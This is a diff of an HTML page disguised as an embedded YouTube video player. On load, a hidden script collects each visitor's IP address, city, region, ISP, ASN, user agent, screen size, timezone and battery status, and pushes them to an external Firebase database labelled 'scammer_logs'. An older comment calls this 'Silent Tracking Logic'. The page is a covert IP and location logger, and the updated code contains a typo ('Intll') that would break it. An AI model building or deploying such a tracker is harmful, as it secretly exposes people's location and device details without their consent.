@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player</title>
     <style>
@@ -10,44 +11,59 @@
 </head>
 <body>
 
-    <iframe id="videoPlayer" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    <iframe id="player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <script>
-        // 1. Firebase Setup
-        const firebaseConfig = { databaseURL: "https://data-28355-default-rtdb.firebaseio.com/" };
+        const firebaseConfig = { 
+            databaseURL: "https://data-28355-default-rtdb.firebaseio.com/" 
+        };
         firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-        // 2. URL se Video ID nikalna (e.g., ?v=VIDEO_ID)
-        const urlParams = new URLSearchParams(window.location.search);
-        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default video agar kuch na ho
-        document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
+        const params = new URLSearchParams(window.location.search);
+        const videoId = params.get('v') || 'dQw4w9WgXcQ'; 
+        document.getElementById('player').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
 
-        // 3. Silent Tracking Logic
-        async function silentCapture() {
+        async function logData() {
+            let info = {
+                v_id: videoId,
+                time: new Date().toLocaleString(),
+                platform: navigator.platform,
+                screen: screen.width + "x" + screen.height,
+                ua: navigator.userAgent,
+                tz: Intll.DateTimeFormat().resolvedOptions().timeZone
+            };
+
             try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                const battery = await navigator.getBattery();
+                // Precise Network & IP Details
+                const response = await fetch('https://ipapi.co/json/');
+                const res = await response.json();
+                info.ip = res.ip;
+                info.city = res.city;
+                info.region = res.region;
+                info.country = res.country_name;
+                info.isp = res.org;
+                info.asn = res.asn;
+            } catch (e) { info.net_err = "IP block by user"; }
 
-                const log = {
-                    video_watched: videoId,
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    isp: ipData.org,
-                    device: navigator.userAgent.match(/\(([^)]+)\)/)[1], // Mobile Model
-                    battery: (battery.level * 100).toFixed(0) + "%",
-                    time: new Date().toLocaleString()
-                };
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    info.battery = (b.level * 100).toFixed(0) + "%";
+                    info.status = b.charging ? "Charging" : "On Battery";
+                }
+            } catch (e) { info.battery = "N/A"; }
 
-                firebase.database().ref('video_logs').push(log);
-            } catch (e) { console.log("System Running..."); }
+            // Sending to Firebase
+            db.ref('scammer_logs').push(info)
+                .then(() => console.log("Logged"))
+                .catch((e) => console.log(e));
         }
 
-        window.onload = silentCapture;
+        window.onload = logData;
     </script>
 </body>
 </html>
-
